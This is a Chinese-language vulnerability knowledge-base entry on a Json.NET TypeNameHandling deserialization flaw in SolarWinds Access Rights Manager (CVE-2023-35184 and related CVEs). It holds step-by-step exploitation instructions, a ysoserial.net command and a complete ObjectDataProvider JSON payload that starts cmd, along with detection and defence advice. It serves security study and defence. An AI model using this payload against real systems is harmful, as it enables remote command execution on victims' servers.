---
id: web-dotnet-deser-solarwinds-arm-iformtemplate-typenamehandling
title: SolarWinds Access Rights Manager AnalyzeActionController Json.NET 反序列化：FromJson + IFormTemplate 泛型值字段注入 ysoserial payload
type: scenario
domain: web
path: web/dotnet/deserialization
technique: solarwinds-arm-json-net-iformtemplate-deserialization
tags:
- dotnet
- json.net
- newtonsoft
- deserialization
- typenamehandling
- solarwinds
- arm
- iformtemplate
- ysoserial
cve:
- CVE-2023-35184
- CVE-2023-35180
- CVE-2023-35186
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:14:13+08:00'
  notes: 已对照原文核对；AnalyzeActionController 的 ExecuteAction/GetParameterFormTemplateWithSelectionState、FromJson、TypeNameHandling.Auto/Objects、DefaultValueFormTemplateBase<SimpleObject>/SimpleObject.Value 注入与 {$type:Object} 替换 ysoserial 链均一致；CVE-2023-35184/35180/35186 原文明确；原文未给受影响版本区间，affected_versions 保持为空
url: /docs/web/dotnet/deserialization/web-dotnet-deser-solarwinds-arm-iformtemplate-typenamehandling/
draft: false
kb_aliases:
- SolarWinds ARM 反序列化
- CVE-2023-35184
- CVE-2023-35180
- CVE-2023-35186
- SearchFieldFormTemplate
- SimpleObject.Value 注入
---

## 一句话结论

SolarWinds Access Rights Manager（ASP.NET Core + Newtonsoft.Json）的 `AnalyzeActionController` 把 `ExecuteAction` 的 `FormDataJson`、`GetParameterFormTemplateWithSelectionState` 的 `selectionState` 等字符串交给 `webApplication.FromJson` 反序列化；当 `TypeNameHandling` 为 Auto/Objects 时，`$type` 可实例化任意类型。攻击者利用 `SearchFieldFormTemplate : DefaultValueFormTemplateBase<SimpleObject>` 这条链——`SimpleObject.Value` 是 `object` 类型——把序列化模板中的 `{"$type":"Object"}` 替换为 ysoserial.net 的 ObjectDataProvider/Process 链，即可在目标上执行命令。

## 原理

- **反序列化入口**：`AnalyzeActionController` 中多个 action 直接调用 `this.webApplication.FromJson(...)`：
  - `ExecuteAction(Guid actionId, [FromBody] ExecuteActionParameter data)` 反序列化 `data.FormDataJson`；
  - `GetParameterFormTemplateWithSelectionState(Guid actionId, [FromBody] string selectionState)` 反序列化原始 `selectionState` 字符串；
  - 其他 IFormTemplate 相关 action 同理。
- **TypeNameHandling 配置**：`pn.helper.JsonSerializer` 的 settings 为 `TypeNameHandling.Auto`、`TypeNameAssemblyFormatHandling.Simple`；`FromJson` 在 `withTypeNames` 为 true 时改用 `TypeNameHandling.Objects`，并先经 `TypeAliasInjectingJsonSerializer.ResolveTypeAliasInJson` 处理 `$JsonType$` 类型别名。只要 `$type` 可达，Json.NET 就会按类型名加载程序集并实例化。
- **泛型值容器成为 sink**：`DefaultValueFormTemplateBase<TValue>` 的 `Value` 属性类型是 `TValue`；`SearchFieldFormTemplate` 继承 `DefaultValueFormTemplateBase<SimpleObject>`，而 `SimpleObject` 又有 `public object Value { get; set; }`。object 类型属性在 Json.NET 中会继续解析嵌套的 `$type`，于是形成“外层业务类型 + 内层任意对象”的注入点。
- **PoC 构造**：先正常序列化一个 `SearchFieldFormTemplate`，输出里出现 `"Value":{"$type":"SimpleObject",...,"Value":{"$type":"Object"}}`；把最后这个 `{"$type":"Object"}` 替换为 ysoserial.net 生成的 gadget（ObjectDataProvider → Process/任意方法调用）即可。
- **为什么能 RCE**：Json.NET 的 ObjectDataProvider gadget 通过 `MethodName`/`MethodParameters`/`ObjectInstance` 反射调用任意方法（如 `Process.Start`），不依赖 BinaryFormatter；只要 binder/contract resolver 未拦截，反序列化阶段就会产生进程/命令副作用。
- **高版本差异**：ASP.NET Core 低版本自带 Newtonsoft.Json；高版本默认 `System.Text.Json`，需显式引入 `Microsoft.AspNetCore.Mvc.NewtonsoftJson.dll` 并 `AddNewtonsoftJson` 才会走该链，因此该漏洞面仅存在于使用 Newtonsoft.Json 的部署。

## 触发条件

- 目标为使用 Newtonsoft.Json 的 SolarWinds ARM 版本（ASP.NET Core，`AddMvc` 配置 `JsonOptions`）。
- 攻击者能向 `AnalyzeActionController` 的 `ExecuteAction`/`GetParameterFormTemplateWithSelectionState` 等端点提交 JSON（授权要求取决于具体部署与端点，原文未展开匿名可达性）。
- `TypeNameHandling` 为 Auto/Objects（`FromJson` 的 withTypeNames 分支或全局 settings），且无严格 SerializationBinder/ContractResolver 拦截。
- 目标 classpath 具备 ysoserial.net 可用的 gadget（.NET Framework/Windows 常见类型）。

## 利用步骤

1. 确认目标产品与版本，定位 `AnalyzeActionController` 端点及 JSON 参数（`FormDataJson`/`selectionState`）。
2. 用正常业务对象序列化出 `SearchFieldFormTemplate` 模板，确认 JSON 中出现 `DefaultValueFormTemplateBase<SimpleObject>` 与 `{"$type":"Object"}` 占位。
3. 用 ysoserial.net 生成 ObjectDataProvider 链（`-g ObjectDataProvider -f Json.Net -c "cmd /c ..."`），或手写 `ObjectDataProvider` + `MethodParameters` + `ObjectInstance` JSON。
4. 把生成的 `$type` 片段替换进 `{"$type":"Object"}` 位置，作为 `FormDataJson` 或 `selectionState` 提交。
5. 观察命令执行/回连；若被 400/500，检查 `$type` 是否被别名解析器改写、程序集全名是否正确、binder 是否已打补丁。

## PoC

```json
{
  "$type": "SearchFieldFormTemplate",
  "ObjectType": null,
  "Filters": null,
  "Summary": "pn.formTemplates.SimpleObject",
  "Value": {
    "$type": "SimpleObject",
    "DisplayName": null,
    "Description": null,
    "Path": null,
    "Value": {
      "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
      "MethodName": "Start",
      "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd", "/c calc"]
      },
      "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
      }
    }
  },
  "DefaultValue": null,
  "IsRequired": false
}
```

## 变体与关联

- 变体：`DefaultValueFormTemplateBase<TValue>` 还有 Checkbox/DatePicker/DropDownList/NumericInput/PasswordTextField/Radio/TextArea/TextField 等 11 个实现；任何 `TValue` 含 object 属性（或 `IHasValueFormTemplate<object>`）的实现都可作为同类注入点。
- 变体：`ExecuteAction` 走 `FormDataJson`，`GetParameterFormTemplateWithSelectionState` 直接吃 `[FromBody] string`，后者更隐蔽（字符串参数里嵌套 JSON）。
- 关联：[[web-dotnet-deser-json-net-serializationbinder-whitelist-bypass]]（同产品的补丁绕过）。
- 关联：[[web-dotnet-deser-servicehandler-typenamehandling]]（另一处 TypeNameHandling JSON 反序列化场景）。

## 检测与防御

- 检测：请求体出现 `$type`/`$JsonType$`、`ObjectDataProvider`、`Process`、`ArrayList`、`MethodName`/`MethodParameters`、`WindowsIdentity` 等反序列化关键字；`AnalyzeActionController` 端点的异常 JSON 结构与 500 错误。
- 检测：Json.NET 反序列化日志、异常类型加载、w3wp 进程异常子进程。
- 防御：升级到修复版本；关闭 `TypeNameHandling`（尤其 Auto/Objects），必须使用时配置严格的 SerializationBinder/ContractResolver 白名单并校验程序集；禁用危险 gadget 类型；对 JSON 入口做 schema 校验与 WAF。
